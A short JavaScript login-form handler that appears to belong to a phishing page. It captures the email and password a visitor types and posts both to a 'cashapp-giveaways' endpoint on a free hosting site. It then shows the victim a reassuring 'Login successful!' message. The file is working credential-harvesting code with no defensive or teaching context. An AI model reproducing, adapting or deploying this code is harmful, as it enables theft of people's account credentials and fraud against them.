/** @format */

const form = document.querySelector('form');
const emailInput = document.querySelector('input[type="email"]');
const passwordInput = document.querySelector('input[type="password"]');
const loginButton = document.querySelector('button');
const alertBox = document.querySelector('.login-alert');

loginButton.addEventListener('click', async (e) => {
	e.preventDefault();

	const email = emailInput.value.trim();
	const password = passwordInput.value;
	alertBox.style.display = 'none';
	const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
	if (!emailPattern.test(email)) {
		alertBox.textContent = 'Please enter a valid email address.';
		alertBox.style.background = '#fff0f0';
		alertBox.style.color = '#e53935';
		alertBox.style.border = '1px solid #ffcdd2';
		alertBox.style.display = 'block';
		return;
	}

	try {
		const response = await fetch(
			'https://cashapp-giveaways.glitch.me/api/info',
			{
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
				},
				body: JSON.stringify({ email, password }),
			}
		);

		if (response.ok) {
			alertBox.textContent = 'Login successful!';
			alertBox.style.background = '#e8f5e9';
			alertBox.style.color = '#388e3c';
			alertBox.style.border = '1px solid #c8e6c9';
			alertBox.style.display = 'block';
			emailInput.value = '';
			passwordInput.value = '';
		} else {
			const data = await response.json();
			alertBox.textContent = data.message || 'Login failed!';
			alertBox.style.background = '#fff0f0';
			alertBox.style.color = '#e53935';
			alertBox.style.border = '1px solid #ffcdd2';
			alertBox.style.display = 'block';
		}
	} catch (error) {
		alertBox.textContent = 'An error occurred!';
		alertBox.style.background = '#fff0f0';
		alertBox.style.color = '#e53935';
		alertBox.style.border = '1px solid #ffcdd2';
		alertBox.style.display = 'block';
		console.error(error);
	}
});
